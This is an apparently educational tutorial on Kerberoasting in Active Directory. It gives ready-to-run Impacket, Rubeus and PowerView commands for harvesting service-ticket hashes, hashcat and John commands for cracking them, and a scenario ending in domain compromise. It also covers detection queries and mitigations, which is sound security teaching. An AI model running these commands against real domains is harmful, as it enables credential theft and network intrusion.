# 🔥 Kerberoasting — Active Directory Attack Technique

**Kerberoasting** is an attack that targets **service accounts** in Active Directory by requesting Kerberos service tickets (TGS) and cracking them offline to reveal plaintext passwords.

> Unlike AS-REP Roasting, Kerberoasting requires a **valid domain user account** but can target any account with a **Service Principal Name (SPN)** registered.

---

## 🔐 How Kerberos Service Tickets Work

Normal Kerberos flow:

1. User authenticates → receives **TGT** (Ticket Granting Ticket)
2. User requests access to a service → sends **TGS-REQ** to DC
3. DC returns **TGS** (Ticket Granting Service ticket)
4. TGS is encrypted with the **service account's NTLM hash**

The vulnerability:

> Any authenticated domain user can request a TGS for any service with an SPN — and the TGS is encrypted with the service account's password hash.

If the service account has a weak password → attacker cracks it offline.

---

## 🎯 What Makes an Account Kerberoastable?

An account is vulnerable if:

* It has an **SPN** (Service Principal Name) registered
* It uses a **user-managed password** (not a machine account)
* The password is weak or old

Common targets:

| Account Type | Example SPN | Risk Level |
| --- | --- | --- |
| SQL Service | MSSQLSvc/sqlserver.domain.local:1433 | High |
| HTTP Service | HTTP/webserver.domain.local | Medium |
| Exchange | exchangeMDB/mailserver.domain.local | High |
| Custom Apps | customapp/appserver.domain.local | High |

---

## 🛠 Tools for Kerberoasting

---

### 1️⃣ Impacket — GetUserSPNs.py

Most popular Linux-based tool.

#### Enumerate SPNs

```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10
```

#### Request and Save TGS Hashes

```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile tgs_hashes.txt
```

Output format:

```
$krb5tgs$23$*sqlsvc$DOMAIN.LOCAL$domain.local/sqlsvc*$HASHDATA...
```

---

### 2️⃣ Rubeus (Windows)

#### Kerberoast All SPN Accounts

```powershell
Rubeus.exe kerberoast
```

#### Target Specific User

```powershell
Rubeus.exe kerberoast /user:sqlsvc
```

#### Output in Hashcat Format

```powershell
Rubeus.exe kerberoast /format:hashcat /outfile:tgs_hashes.txt
```

---

### 3️⃣ PowerView (PowerShell)

#### Find All SPN Accounts

```powershell
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

#### Request TGS Ticket

```powershell
Request-SPNTicket -SPN "MSSQLSvc/sqlserver.domain.local:1433"
```

---

### 4️⃣ Cracking with Hashcat

TGS hash mode:

```
13100
```

Crack command:

```bash
hashcat -m 13100 tgs_hashes.txt rockyou.txt
```

With rules:

```bash
hashcat -m 13100 tgs_hashes.txt rockyou.txt -r best64.rule
```

---

### 5️⃣ Cracking with John the Ripper

```bash
john --format=krb5tgs tgs_hashes.txt --wordlist=rockyou.txt
```

---

## 🔥 Realistic Attack Scenario

### Scenario: SQL Service Account Compromise

1. Attacker compromises low-privilege domain user via phishing.
2. Enumerates SPNs:

   ```bash
   GetUserSPNs.py corp.local/jsmith:Password1 -dc-ip 10.0.0.100
   ```

3. Finds: `sqlsvc` with SPN `MSSQLSvc/sql01.corp.local:1433`
4. Requests TGS hash.
5. Cracks offline → Password: `SQLAdmin2020!`
6. `sqlsvc` has **local admin** on SQL server.
7. Attacker accesses SQL server → dumps database.
8. From SQL server → finds Domain Admin credentials → **domain compromise**.

---

## 🧠 Kerberoasting vs AS-REP Roasting

| Feature | Kerberoasting | AS-REP Roasting |
| --- | --- | --- |
| Requires Domain Creds | ✅ Yes | ❌ Not always |
| Target | SPN service accounts | Pre-auth disabled accounts |
| Kerberos Message | TGS-REP | AS-REP |
| Hashcat Mode | 13100 | 18200 |
| More Common | ✅ Yes | Less common |

---

## 🛡 Detection & Mitigation

### 🔎 Detection

Monitor for:

* **Event ID 4769** — Kerberos Service Ticket Request
* High volume of TGS requests from single user
* TGS requests for unusual services
* Encryption type **RC4 (0x17)** — attackers prefer RC4 because it's faster to crack

SIEM/Splunk query concept:

```
EventCode=4769 TicketEncryptionType=0x17 | stats count by TargetUserName, IpAddress
```

---

### 🔐 Mitigation

✅ Use **long, complex passwords** for service accounts (25+ characters)
✅ Use **Group Managed Service Accounts (gMSA)** — passwords auto-rotated
✅ Enforce **AES encryption** instead of RC4
✅ Regularly audit SPN assignments
✅ Monitor for mass TGS requests
✅ Limit service account privileges (least privilege principle)

---

## ⚠ Ethical Reminder

Everything discussed:

* Legal only in authorized labs
* Legal with written penetration testing authorization
* Illegal otherwise

---

## 📚 What to Learn Next

* 🎫 Golden Ticket & Silver Ticket attacks
* 🧠 DCSync attack
* 🔍 BloodHound for AD enumeration
* 🛡 Blue team Kerberos monitoring strategies
